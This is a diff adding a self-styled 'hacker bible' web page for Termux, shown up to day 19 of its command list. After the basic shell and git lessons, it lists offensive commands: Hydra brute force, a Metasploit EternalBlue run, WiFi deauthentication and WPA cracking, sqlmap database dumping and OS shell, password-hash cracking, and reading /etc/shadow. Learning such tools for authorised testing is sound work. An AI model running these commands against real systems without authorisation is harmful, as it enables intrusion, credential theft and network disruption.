@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TERMUX HACKER BIBLE — Day 1 to 30</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --green: #00ff41;
+    --green2: #00cc33;
+    --cyan: #00fff5;
+    --red: #ff003c;
+    --yellow: #ffe600;
+    --bg: #000000;
+    --bg2: #050f05;
+    --bg3: #0a1a0a;
+    --card: #071007;
+    --border: #00ff4133;
+    --glow: 0 0 10px #00ff41aa, 0 0 30px #00ff4144;
+    --glow2: 0 0 6px #00fff5aa;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    overflow-x: hidden;
+    cursor: none;
+  }
+
+  /* Custom cursor */
+  .cursor {
+    position: fixed;
+    width: 20px; height: 20px;
+    border: 2px solid var(--green);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9999;
+    transition: transform 0.1s;
+    mix-blend-mode: screen;
+  }
+  .cursor-dot {
+    position: fixed;
+    width: 4px; height: 4px;
+    background: var(--green);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Matrix rain canvas */
+  #matrix {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0.04;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Scanlines overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.015) 2px,
+      rgba(0,255,65,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* Noise texture */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 1;
+    opacity: 0.4;
+  }
+
+  .wrapper { position: relative; z-index: 2; }
+
+  /* ===== HEADER ===== */
+  header {
+    text-align: center;
+    padding: 50px 20px 30px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 50%;
+    transform: translateX(-50%);
+    width: 600px; height: 300px;
+    background: radial-gradient(ellipse, #00ff4115 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .skull {
+    font-size: 50px;
+    display: block;
+    animation: pulse 2s infinite;
+    filter: drop-shadow(0 0 15px var(--green));
+  }
+
+  .main-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(24px, 5vw, 56px);
+    font-weight: 900;
+    letter-spacing: 4px;
+    color: var(--green);
+    text-shadow: var(--glow);
+    animation: flicker 4s infinite;
+    line-height: 1.1;
+  }
+
+  .sub-title {
+    font-family: 'VT323', monospace;
+    font-size: clamp(18px, 3vw, 28px);
+    color: var(--cyan);
+    letter-spacing: 6px;
+    margin-top: 8px;
+    text-shadow: var(--glow2);
+  }
+
+  .header-stats {
+    display: flex;
+    justify-content: center;
+    gap: 40px;
+    margin-top: 25px;
+    flex-wrap: wrap;
+  }
+
+  .stat-box {
+    border: 1px solid var(--border);
+    padding: 10px 20px;
+    background: rgba(0,255,65,0.03);
+    position: relative;
+  }
+  .stat-box::before {
+    content: '';
+    position: absolute;
+    top: -1px; left: 10px;
+    width: 30px; height: 2px;
+    background: var(--bg);
+  }
+  .stat-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 28px;
+    color: var(--green);
+    font-weight: 700;
+    text-shadow: var(--glow);
+  }
+  .stat-label {
+    font-size: 11px;
+    color: #00aa22;
+    letter-spacing: 2px;
+  }
+
+  /* ===== TERMINAL BAR ===== */
+  .terminal-bar {
+    background: #050f05;
+    border-bottom: 1px solid var(--border);
+    padding: 10px 30px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    font-size: 13px;
+  }
+  .terminal-dots span {
+    display: inline-block;
+    width: 12px; height: 12px;
+    border-radius: 50%;
+    margin-right: 5px;
+  }
+  .dot-r { background: #ff5f56; box-shadow: 0 0 5px #ff5f56; }
+  .dot-y { background: #ffbd2e; box-shadow: 0 0 5px #ffbd2e; }
+  .dot-g { background: #27c93f; box-shadow: 0 0 5px #27c93f; }
+  .terminal-path { color: #00aa22; }
+  .terminal-cursor {
+    display: inline-block;
+    width: 8px; height: 16px;
+    background: var(--green);
+    animation: blink 1s infinite;
+    vertical-align: middle;
+  }
+
+  /* ===== SEARCH BAR ===== */
+  .search-container {
+    padding: 25px 30px;
+    max-width: 800px;
+    margin: 0 auto;
+  }
+  .search-wrapper {
+    position: relative;
+    border: 1px solid var(--green2);
+    background: rgba(0,255,65,0.03);
+    display: flex;
+    align-items: center;
+    padding: 0 15px;
+    box-shadow: inset 0 0 20px rgba(0,255,65,0.05), var(--glow);
+  }
+  .search-prefix { color: var(--green); margin-right: 10px; font-size: 16px; }
+  .search-input {
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--cyan);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 15px;
+    flex: 1;
+    padding: 14px 0;
+    caret-color: var(--green);
+  }
+  .search-input::placeholder { color: #004d15; }
+
+  /* ===== DAY FILTER ===== */
+  .filter-section {
+    padding: 0 30px 20px;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+  .filter-label {
+    font-size: 11px;
+    letter-spacing: 3px;
+    color: #007722;
+    margin-bottom: 12px;
+  }
+  .day-filters {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+  .day-btn {
+    padding: 5px 12px;
+    border: 1px solid #00ff4133;
+    background: transparent;
+    color: #00aa22;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    cursor: none;
+    transition: all 0.2s;
+    letter-spacing: 1px;
+  }
+  .day-btn:hover, .day-btn.active {
+    background: rgba(0,255,65,0.1);
+    border-color: var(--green);
+    color: var(--green);
+    box-shadow: var(--glow);
+  }
+  .day-btn.all-btn {
+    border-color: var(--cyan);
+    color: var(--cyan);
+  }
+  .day-btn.all-btn:hover, .day-btn.all-btn.active {
+    background: rgba(0,255,245,0.1);
+    box-shadow: var(--glow2);
+  }
+
+  /* ===== MAIN CONTENT ===== */
+  main {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 20px 30px 60px;
+  }
+
+  /* ===== DAY SECTION ===== */
+  .day-section {
+    margin-bottom: 40px;
+    border: 1px solid #00ff4122;
+    background: var(--card);
+    position: relative;
+    transition: border-color 0.3s;
+  }
+  .day-section:hover { border-color: #00ff4155; }
+  .day-section.hidden { display: none; }
+
+  .day-header {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    padding: 16px 20px;
+    background: #071407;
+    border-bottom: 1px solid #00ff4122;
+    cursor: none;
+    user-select: none;
+    position: relative;
+    overflow: hidden;
+  }
+  .day-header::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0;
+    width: 3px; height: 100%;
+    background: var(--green);
+    box-shadow: 0 0 10px var(--green);
+  }
+  .day-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--green);
+    text-shadow: var(--glow);
+    min-width: 80px;
+  }
+  .day-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    color: var(--cyan);
+    letter-spacing: 2px;
+    text-shadow: var(--glow2);
+    flex: 1;
+  }
+  .day-badge {
+    font-size: 11px;
+    padding: 3px 10px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .badge-basic { border-color: var(--green); color: var(--green); }
+  .badge-intermediate { border-color: var(--yellow); color: var(--yellow); }
+  .badge-advanced { border-color: var(--red); color: var(--red); }
+  .day-toggle {
+    color: var(--green);
+    font-size: 18px;
+    transition: transform 0.3s;
+  }
+  .day-section.collapsed .day-toggle { transform: rotate(-90deg); }
+
+  .commands-grid {
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+    gap: 12px;
+  }
+  .day-section.collapsed .commands-grid { display: none; }
+
+  /* ===== COMMAND CARD ===== */
+  .cmd-card {
+    border: 1px solid #00ff4120;
+    background: #020802;
+    padding: 14px;
+    position: relative;
+    transition: all 0.25s;
+    overflow: hidden;
+  }
+  .cmd-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--green), transparent);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .cmd-card:hover {
+    border-color: #00ff4155;
+    background: #031203;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 20px rgba(0,255,65,0.1);
+  }
+  .cmd-card:hover::before { opacity: 1; }
+
+  .cmd-line {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+  .cmd-dollar { color: var(--green); font-size: 14px; flex-shrink: 0; margin-top: 2px; }
+  .cmd-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: var(--cyan);
+    word-break: break-all;
+    cursor: pointer;
+    transition: color 0.2s;
+  }
+  .cmd-text:hover { color: #fff; text-shadow: 0 0 8px var(--cyan); }
+  .cmd-desc {
+    font-size: 12px;
+    color: #005520;
+    margin-left: 20px;
+    line-height: 1.5;
+  }
+  .cmd-tag {
+    display: inline-block;
+    font-size: 10px;
+    padding: 1px 7px;
+    border: 1px solid #00ff4130;
+    color: #008822;
+    margin-left: 20px;
+    margin-top: 5px;
+    letter-spacing: 1px;
+  }
+
+  /* Copy tooltip */
+  .copy-toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,255,65,0.15);
+    border: 1px solid var(--green);
+    color: var(--green);
+    padding: 10px 25px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    letter-spacing: 2px;
+    box-shadow: var(--glow);
+    z-index: 9000;
+    opacity: 0;
+    transition: opacity 0.3s;
+    pointer-events: none;
+  }
+  .copy-toast.show { opacity: 1; }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 30px;
+    border-top: 1px solid var(--border);
+    color: #003d10;
+    font-size: 12px;
+    letter-spacing: 3px;
+    position: relative;
+    z-index: 2;
+  }
+
+  /* Animations */
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.1)} }
+  @keyframes flicker {
+    0%,19%,21%,23%,25%,54%,56%,100% { text-shadow: var(--glow); opacity:1; }
+    20%,24%,55% { text-shadow:none; opacity:0.8; }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: #000; }
+  ::-webkit-scrollbar-thumb { background: var(--green2); }
+
+  /* Results count */
+  .results-info {
+    padding: 0 30px 15px;
+    max-width: 1400px;
+    margin: 0 auto;
+    font-size: 12px;
+    color: #006620;
+    letter-spacing: 2px;
+  }
+
+  .no-results {
+    text-align: center;
+    padding: 60px;
+    color: #003d10;
+    font-size: 20px;
+    display: none;
+  }
+
+  @media(max-width:600px) {
+    header { padding: 30px 15px 20px; }
+    main { padding: 15px; }
+    .header-stats { gap: 20px; }
+    .commands-grid { grid-template-columns: 1fr; }
+    .day-filters { gap: 4px; }
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-dot" id="cursorDot"></div>
+<div class="copy-toast" id="toast">⚡ COPIED TO CLIPBOARD</div>
+
+<div class="wrapper">
+
+<!-- HEADER -->
+<header>
+  <span class="skull">💀</span>
+  <h1 class="main-title">TERMUX HACKER BIBLE</h1>
+  <p class="sub-title">[ DAY 1 → DAY 30 :: BASIC TO ADVANCE ]</p>
+  <div class="header-stats">
+    <div class="stat-box">
+      <div class="stat-num">30</div>
+      <div class="stat-label">TOTAL DAYS</div>
+    </div>
+    <div class="stat-box">
+      <div class="stat-num" id="totalCmds">300+</div>
+      <div class="stat-label">COMMANDS</div>
+    </div>
+    <div class="stat-box">
+      <div class="stat-num">3</div>
+      <div class="stat-label">LEVELS</div>
+    </div>
+  </div>
+</header>
+
+<!-- TERMINAL BAR -->
+<div class="terminal-bar">
+  <div class="terminal-dots">
+    <span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span>
+  </div>
+  <span class="terminal-path">root@termux:~$</span>
+  <span style="color:#00aa22">cat termux_bible.sh</span>
+  <span class="terminal-cursor"></span>
+</div>
+
+<!-- SEARCH -->
+<div class="search-container">
+  <div class="search-wrapper">
+    <span class="search-prefix">grep -r "</span>
+    <input type="text" class="search-input" id="searchInput" placeholder="search commands..." oninput="filterAll()">
+    <span class="search-prefix" style="margin-left:5px">"</span>
+  </div>
+</div>
+
+<!-- FILTER BUTTONS -->
+<div class="filter-section">
+  <div class="filter-label">// JUMP TO DAY</div>
+  <div class="day-filters" id="dayFilters"></div>
+</div>
+
+<div class="results-info" id="resultsInfo"></div>
+<div class="no-results" id="noResults">❌ NO COMMANDS FOUND — TRY DIFFERENT QUERY</div>
+
+<!-- MAIN CONTENT -->
+<main id="mainContent"></main>
+
+<footer>
+  ⚡ TERMUX HACKER BIBLE v1.0 &nbsp;|&nbsp; USE RESPONSIBLY &nbsp;|&nbsp; KNOWLEDGE IS POWER ⚡
+</footer>
+</div>
+
+<script>
+// ===== DATA =====
+const days = [
+  {
+    day: 1, title: "FIRST BOOT — SETUP & BASICS", level: "basic",
+    cmds: [
+      { cmd: "pkg update", desc: "Update all package lists from repository" },
+      { cmd: "pkg upgrade", desc: "Upgrade all installed packages to latest version" },
+      { cmd: "pkg install git", desc: "Install Git version control system" },
+      { cmd: "pkg install python", desc: "Install Python 3 interpreter" },
+      { cmd: "pkg install curl", desc: "Install cURL for HTTP requests" },
+      { cmd: "pkg install wget", desc: "Install wget downloader" },
+      { cmd: "termux-setup-storage", desc: "Grant storage permission to Termux" },
+      { cmd: "pkg list-installed", desc: "List all currently installed packages" },
+      { cmd: "pkg search <name>", desc: "Search for a package in repository" },
+      { cmd: "whoami", desc: "Display current user name" },
+    ]
+  },
+  {
+    day: 2, title: "FILE SYSTEM NAVIGATION", level: "basic",
+    cmds: [
+      { cmd: "ls", desc: "List files and directories" },
+      { cmd: "ls -la", desc: "List all files with hidden files and permissions" },
+      { cmd: "cd /sdcard", desc: "Navigate to SD card / phone storage" },
+      { cmd: "cd ~", desc: "Go to home directory" },
+      { cmd: "pwd", desc: "Print current working directory path" },
+      { cmd: "mkdir myfolder", desc: "Create a new directory" },
+      { cmd: "rm -rf foldername", desc: "Force delete folder and all contents" },
+      { cmd: "cp file1 file2", desc: "Copy file1 to file2" },
+      { cmd: "mv file1 newname", desc: "Move or rename a file" },
+      { cmd: "touch newfile.txt", desc: "Create an empty file" },
+    ]
+  },
+  {
+    day: 3, title: "TEXT EDITING & FILE READING", level: "basic",
+    cmds: [
+      { cmd: "cat file.txt", desc: "Display entire file content" },
+      { cmd: "nano file.txt", desc: "Open nano text editor" },
+      { cmd: "vi file.txt", desc: "Open Vi text editor" },
+      { cmd: "head -n 20 file.txt", desc: "Show first 20 lines of file" },
+      { cmd: "tail -n 20 file.txt", desc: "Show last 20 lines of file" },
+      { cmd: "grep 'text' file.txt", desc: "Search for text pattern in file" },
+      { cmd: "wc -l file.txt", desc: "Count lines in a file" },
+      { cmd: "echo 'hello' > file.txt", desc: "Write text to file (overwrite)" },
+      { cmd: "echo 'text' >> file.txt", desc: "Append text to existing file" },
+      { cmd: "less file.txt", desc: "View file page by page (q to quit)" },
+    ]
+  },
+  {
+    day: 4, title: "NETWORKING TOOLS", level: "basic",
+    cmds: [
+      { cmd: "ifconfig", desc: "Display network interface configuration" },
+      { cmd: "ip addr", desc: "Show IP addresses of all interfaces" },
+      { cmd: "ping google.com", desc: "Test internet connectivity with ping" },
+      { cmd: "ping -c 4 8.8.8.8", desc: "Ping 4 times to Google DNS" },
+      { cmd: "curl ifconfig.me", desc: "Get your public IP address" },
+      { cmd: "curl -I google.com", desc: "Get HTTP headers of a website" },
+      { cmd: "wget https://example.com", desc: "Download a file from URL" },
+      { cmd: "netstat -tulnp", desc: "Show all open network ports and services" },
+      { cmd: "traceroute google.com", desc: "Trace network path to destination" },
+      { cmd: "nslookup google.com", desc: "DNS lookup for domain" },
+    ]
+  },
+  {
+    day: 5, title: "PACKAGE MANAGEMENT MASTERY", level: "basic",
+    cmds: [
+      { cmd: "pkg install nmap", desc: "Install Nmap network scanner" },
+      { cmd: "pkg install openssh", desc: "Install OpenSSH client/server" },
+      { cmd: "pkg install vim", desc: "Install Vim advanced text editor" },
+      { cmd: "pkg install nodejs", desc: "Install Node.js runtime" },
+      { cmd: "pkg install ruby", desc: "Install Ruby programming language" },
+      { cmd: "pkg install php", desc: "Install PHP scripting language" },
+      { cmd: "pkg install clang", desc: "Install C/C++ compiler" },
+      { cmd: "pkg remove <pkg>", desc: "Remove/uninstall a package" },
+      { cmd: "pkg show <pkg>", desc: "Show detailed info about a package" },
+      { cmd: "apt list --upgradable", desc: "List packages that can be upgraded" },
+    ]
+  },
+  {
+    day: 6, title: "BASH SCRIPTING BASICS", level: "basic",
+    cmds: [
+      { cmd: "#!/bin/bash", desc: "Shebang line — put at top of every script" },
+      { cmd: "chmod +x script.sh", desc: "Make a script executable" },
+      { cmd: "bash script.sh", desc: "Run a bash script" },
+      { cmd: "echo $HOME", desc: "Print HOME environment variable" },
+      { cmd: "export MYVAR='value'", desc: "Set an environment variable" },
+      { cmd: "echo $PATH", desc: "Display system PATH variable" },
+      { cmd: "for i in {1..10}; do echo $i; done", desc: "Loop printing 1 to 10" },
+      { cmd: "if [ -f file.txt ]; then echo yes; fi", desc: "Check if file exists" },
+      { cmd: "read -p 'Enter: ' var", desc: "Read user input into variable" },
+      { cmd: "history", desc: "Show command history" },
+    ]
+  },
+  {
+    day: 7, title: "PROCESS MANAGEMENT", level: "basic",
+    cmds: [
+      { cmd: "ps aux", desc: "Show all running processes with details" },
+      { cmd: "top", desc: "Interactive real-time process monitor" },
+      { cmd: "htop", desc: "Advanced interactive process viewer" },
+      { cmd: "kill -9 <PID>", desc: "Force kill a process by PID" },
+      { cmd: "pkill <name>", desc: "Kill process by name" },
+      { cmd: "jobs", desc: "List background jobs in current shell" },
+      { cmd: "bg", desc: "Resume suspended job in background" },
+      { cmd: "fg", desc: "Bring background job to foreground" },
+      { cmd: "Ctrl+Z", desc: "Suspend current running process" },
+      { cmd: "nohup command &", desc: "Run command immune to hangups" },
+    ]
+  },
+  {
+    day: 8, title: "SSH & REMOTE ACCESS", level: "basic",
+    cmds: [
+      { cmd: "sshd", desc: "Start SSH daemon (server) in Termux" },
+      { cmd: "ssh user@host", desc: "Connect to remote server via SSH" },
+      { cmd: "ssh -p 8022 user@host", desc: "SSH on custom port (Termux default: 8022)" },
+      { cmd: "ssh-keygen -t rsa", desc: "Generate RSA SSH key pair" },
+      { cmd: "ssh-copy-id user@host", desc: "Copy public key to remote server" },
+      { cmd: "scp file user@host:/path", desc: "Securely copy file to remote" },
+      { cmd: "sftp user@host", desc: "Secure FTP session" },
+      { cmd: "cat ~/.ssh/id_rsa.pub", desc: "View your public SSH key" },
+      { cmd: "ssh -L 8080:localhost:80 user@host", desc: "SSH local port forwarding" },
+      { cmd: "exit", desc: "Close SSH session" },
+    ]
+  },
+  {
+    day: 9, title: "PYTHON HACKING SCRIPTS", level: "intermediate",
+    cmds: [
+      { cmd: "python3 -m http.server 8080", desc: "Start HTTP server on port 8080" },
+      { cmd: "python3 -c \"import socket; print(socket.gethostbyname('google.com'))\"", desc: "DNS lookup with Python" },
+      { cmd: "pip install requests", desc: "Install Python requests library" },
+      { cmd: "pip install scapy", desc: "Install Scapy packet manipulation tool" },
+      { cmd: "pip install paramiko", desc: "Install SSH library for Python" },
+      { cmd: "pip install pwntools", desc: "Install CTF/exploitation toolkit" },
+      { cmd: "python3 -m venv myenv", desc: "Create Python virtual environment" },
+      { cmd: "source myenv/bin/activate", desc: "Activate virtual environment" },
+      { cmd: "pip freeze > requirements.txt", desc: "Save all installed packages list" },
+      { cmd: "pip install -r requirements.txt", desc: "Install all packages from file" },
+    ]
+  },
+  {
+    day: 10, title: "GIT & VERSION CONTROL", level: "basic",
+    cmds: [
+      { cmd: "git init", desc: "Initialize new git repository" },
+      { cmd: "git clone <url>", desc: "Clone remote repository locally" },
+      { cmd: "git add .", desc: "Stage all changes for commit" },
+      { cmd: "git commit -m 'message'", desc: "Commit staged changes with message" },
+      { cmd: "git push origin main", desc: "Push commits to remote repository" },
+      { cmd: "git pull", desc: "Fetch and merge remote changes" },
+      { cmd: "git status", desc: "Show working tree status" },
+      { cmd: "git log --oneline", desc: "Show commit history (compact)" },
+      { cmd: "git branch -a", desc: "List all branches (local + remote)" },
+      { cmd: "git checkout -b newbranch", desc: "Create and switch to new branch" },
+    ]
+  },
+  {
+    day: 11, title: "NMAP NETWORK SCANNING", level: "intermediate",
+    cmds: [
+      { cmd: "nmap 192.168.1.1", desc: "Basic scan of single IP address" },
+      { cmd: "nmap -sV 192.168.1.1", desc: "Detect service versions on open ports" },
+      { cmd: "nmap -O 192.168.1.1", desc: "Detect operating system of target" },
+      { cmd: "nmap -p 1-1000 192.168.1.1", desc: "Scan ports 1 to 1000" },
+      { cmd: "nmap -p- 192.168.1.1", desc: "Scan ALL 65535 ports" },
+      { cmd: "nmap -sP 192.168.1.0/24", desc: "Ping scan entire subnet (host discovery)" },
+      { cmd: "nmap -A 192.168.1.1", desc: "Aggressive scan: OS, version, scripts" },
+      { cmd: "nmap -T4 192.168.1.1", desc: "Faster scan with timing template 4" },
+      { cmd: "nmap --script vuln 192.168.1.1", desc: "Run vulnerability detection scripts" },
+      { cmd: "nmap -oN output.txt 192.168.1.1", desc: "Save scan results to text file" },
+    ]
+  },
+  {
+    day: 12, title: "HYDRA BRUTE FORCE BASICS", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install hydra", desc: "Install THC Hydra brute force tool" },
+      { cmd: "hydra -h", desc: "Show Hydra help and options" },
+      { cmd: "hydra -l admin -P wordlist.txt ftp://192.168.1.1", desc: "FTP brute force with username" },
+      { cmd: "hydra -L users.txt -P pass.txt ssh://192.168.1.1", desc: "SSH brute force with wordlists" },
+      { cmd: "hydra -l admin -P pass.txt http-get://site.com/admin", desc: "HTTP basic auth brute force" },
+      { cmd: "hydra -t 4 -l admin -P pass.txt ssh://host", desc: "Limit to 4 parallel threads" },
+      { cmd: "crunch 6 8 -o wordlist.txt", desc: "Generate custom wordlist 6-8 chars" },
+      { cmd: "pkg install wordlist", desc: "Install common wordlist collection" },
+      { cmd: "cat /usr/share/wordlists/rockyou.txt | head", desc: "Preview rockyou wordlist" },
+      { cmd: "hydra -V -l user -P pass.txt smtp://host", desc: "Verbose SMTP brute force" },
+    ]
+  },
+  {
+    day: 13, title: "METASPLOIT FRAMEWORK", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install unstable-repo", desc: "Add unstable repository for Metasploit" },
+      { cmd: "pkg install metasploit", desc: "Install Metasploit Framework" },
+      { cmd: "msfconsole", desc: "Launch Metasploit console" },
+      { cmd: "search eternalblue", desc: "Search for EternalBlue exploit module" },
+      { cmd: "use exploit/windows/smb/ms17_010_eternalblue", desc: "Select exploit module" },
+      { cmd: "show options", desc: "Show required options for module" },
+      { cmd: "set RHOSTS 192.168.1.1", desc: "Set target host IP address" },
+      { cmd: "set LHOST 192.168.1.5", desc: "Set attacker's IP (listener)" },
+      { cmd: "run", desc: "Execute the selected exploit" },
+      { cmd: "sessions -l", desc: "List all active Meterpreter sessions" },
+    ]
+  },
+  {
+    day: 14, title: "WIFI ANALYSIS TOOLS", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install aircrack-ng", desc: "Install Aircrack-ng WiFi toolkit" },
+      { cmd: "iwconfig", desc: "Show wireless network interfaces" },
+      { cmd: "airmon-ng start wlan0", desc: "Enable monitor mode on wlan0" },
+      { cmd: "airodump-ng wlan0mon", desc: "Scan and display nearby WiFi networks" },
+      { cmd: "airodump-ng -c 6 --bssid AA:BB:CC:DD wlan0mon -w cap", desc: "Capture handshake from specific AP" },
+      { cmd: "aireplay-ng -0 5 -a <BSSID> wlan0mon", desc: "Deauth attack to force handshake" },
+      { cmd: "aircrack-ng cap*.cap -w wordlist.txt", desc: "Crack WPA handshake with wordlist" },
+      { cmd: "iwlist wlan0 scan", desc: "List available WiFi networks" },
+      { cmd: "nmcli dev wifi", desc: "Show wifi networks via nmcli" },
+      { cmd: "airmon-ng stop wlan0mon", desc: "Disable monitor mode" },
+    ]
+  },
+  {
+    day: 15, title: "SQLMAP — DATABASE ATTACKS", level: "intermediate",
+    cmds: [
+      { cmd: "pip install sqlmap", desc: "Install SQLmap SQL injection tool" },
+      { cmd: "sqlmap -u 'http://site.com/page?id=1'", desc: "Basic SQLi test on URL parameter" },
+      { cmd: "sqlmap -u 'URL' --dbs", desc: "Enumerate all databases on target" },
+      { cmd: "sqlmap -u 'URL' -D dbname --tables", desc: "List tables in specific database" },
+      { cmd: "sqlmap -u 'URL' -D db -T table --dump", desc: "Dump data from specific table" },
+      { cmd: "sqlmap -u 'URL' --level=5 --risk=3", desc: "Maximum detection level and risk" },
+      { cmd: "sqlmap -u 'URL' --os-shell", desc: "Get OS shell via SQLi (if possible)" },
+      { cmd: "sqlmap -r request.txt", desc: "Test SQLi from saved HTTP request file" },
+      { cmd: "sqlmap -u 'URL' --cookie='id=1'", desc: "Test with custom cookies" },
+      { cmd: "sqlmap -u 'URL' --batch", desc: "Run without user prompts (auto mode)" },
+    ]
+  },
+  {
+    day: 16, title: "JOHN THE RIPPER — PASSWORD CRACK", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install john", desc: "Install John the Ripper" },
+      { cmd: "john hash.txt", desc: "Auto-detect and crack password hashes" },
+      { cmd: "john --wordlist=/path/rockyou.txt hash.txt", desc: "Dictionary attack on hashes" },
+      { cmd: "john --format=md5 hash.txt", desc: "Specify MD5 hash format" },
+      { cmd: "john --format=sha256 hash.txt", desc: "Crack SHA256 hashed passwords" },
+      { cmd: "john --show hash.txt", desc: "Show already cracked passwords" },
+      { cmd: "john --rules hash.txt", desc: "Apply mangling rules to wordlist" },
+      { cmd: "john --incremental hash.txt", desc: "Brute force in incremental mode" },
+      { cmd: "john --restore", desc: "Resume previously interrupted session" },
+      { cmd: "hashid hash.txt", desc: "Identify hash type automatically" },
+    ]
+  },
+  {
+    day: 17, title: "WEB SCANNING — NIKTO & DIRB", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install nikto", desc: "Install Nikto web vulnerability scanner" },
+      { cmd: "nikto -h http://target.com", desc: "Basic web server vulnerability scan" },
+      { cmd: "nikto -h target.com -port 8080", desc: "Scan custom port" },
+      { cmd: "nikto -h target.com -o results.txt", desc: "Save scan output to file" },
+      { cmd: "pkg install dirb", desc: "Install Dirb directory brute forcer" },
+      { cmd: "dirb http://target.com", desc: "Directory brute force with default list" },
+      { cmd: "dirb http://target.com /path/wordlist.txt", desc: "Use custom wordlist for dirb" },
+      { cmd: "gobuster dir -u http://target.com -w wordlist.txt", desc: "Fast directory busting with Gobuster" },
+      { cmd: "wfuzz -c -w words.txt http://target.com/FUZZ", desc: "Web fuzzing with wfuzz" },
+      { cmd: "whatweb http://target.com", desc: "Identify web technologies used" },
+    ]
+  },
+  {
+    day: 18, title: "LINUX PERMISSIONS & PRIVILEGE", level: "intermediate",
+    cmds: [
+      { cmd: "ls -la", desc: "Show permissions for all files in directory" },
+      { cmd: "chmod 777 file", desc: "Give full rwx permissions to everyone" },
+      { cmd: "chmod 600 file", desc: "Owner read/write only (private files)" },
+      { cmd: "chmod +x script.sh", desc: "Add execute permission to script" },
+      { cmd: "chown user:group file", desc: "Change file owner and group" },
+      { cmd: "find / -perm -4000 2>/dev/null", desc: "Find all SUID files (priv esc)" },
+      { cmd: "sudo -l", desc: "List allowed sudo commands for current user" },
+      { cmd: "id", desc: "Show user ID, group ID and groups" },
+      { cmd: "cat /etc/passwd", desc: "View all user accounts on system" },
+      { cmd: "cat /etc/shadow", desc: "View password hashes (root required)" },
+    ]
+  },
+  {
+    day: 19, title: "WIRESHARK / TCPDUMP SNIFFING", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install tcpdump", desc: "Install TCPdump packet analyzer" },
+      { cmd: "tcpdump -i wlan0", desc: "Capture packets on wlan0 interface" },
+      { cmd: "tcpdump -i any", desc: "Capture on all interfaces" },
+      { cmd: "tcpdump -w capture.pcap", desc: "Save captured packets to file" },
+      { cmd: "tcpdump -r capture.pcap", desc: "Read and display saved capture file" },
+      { cmd: "tcpdump port 80", desc: "Capture only HTTP traffic (port 80)" },
+      { cmd: "tcpdump host 192.168.1.1", desc: "Capture traffic from/to specific IP" },
+      { cmd: "tcpdump -X port 80", desc: "Show packet contents in hex+ASCII" },
+      { cmd: "tcpdump -n -v port 443", desc: "Verbose HTTPS traffic capture" },
+      { cmd: "tcpdump 'tcp[tcpflags] & tcp-syn != 0'", desc: "Capture only SYN packets" },
+    ]
+  },
+  {
